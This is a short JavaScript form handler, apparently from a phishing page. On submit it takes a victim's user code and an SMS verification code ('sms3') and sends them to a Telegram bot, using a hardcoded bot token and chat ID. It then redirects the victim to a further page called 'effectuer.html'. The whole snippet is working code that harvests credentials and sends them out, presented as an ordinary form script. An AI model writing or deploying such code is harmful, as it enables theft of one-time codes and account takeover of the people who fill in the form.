var sms = document.getElementById('sms'); // Corrected ID to 'sms'
var usercode = localStorage.getItem('usercode');

document.getElementById('form7').addEventListener('submit', function (e) {
    e.preventDefault();
    const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", -4591101208);

    try {
        bot.sendMessage('👔User : ' + usercode + '💌sms3 : ' + sms.value) // Corrected variable to 'sms'
            .then(res => {
                console.log(res);
                window.location.href = './effectuer.html';
            });
    } catch (err) {
        console.log(err);
    }
});